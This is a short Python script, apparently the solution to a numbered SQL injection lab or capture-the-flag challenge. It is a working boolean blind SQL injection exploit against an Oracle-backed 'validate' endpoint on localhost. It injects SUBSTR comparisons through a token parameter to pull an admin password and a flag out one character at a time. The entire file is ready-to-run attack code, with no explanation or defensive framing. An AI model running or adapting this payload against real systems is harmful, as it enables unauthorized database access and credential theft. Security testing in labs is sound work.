#!/usr/bin/env python3
"""SQLi-024: Oracle Boolean Blind Exploit"""
import requests
import string

BASE_URL = "http://localhost:5024"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(payload):
    r = requests.get(f"{BASE_URL}/validate?token={requests.utils.quote(payload)}", timeout=10)
    return "is valid" in r.text

def extract_oracle(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            payload = f"sess_valid_abc123' AND SUBSTR((SELECT {column} FROM {table} WHERE ROWNUM=1),{pos},1)='{c}'--"
            if check(payload):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("SQLi-024: Oracle Boolean Blind Exploit")
    print("=" * 40)
    
    print("\n[*] Extracting admin password...")
    pwd = extract_oracle("admin_creds", "password")
    
    print("\n[*] Extracting flag...")
    flag = extract_oracle("secrets", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
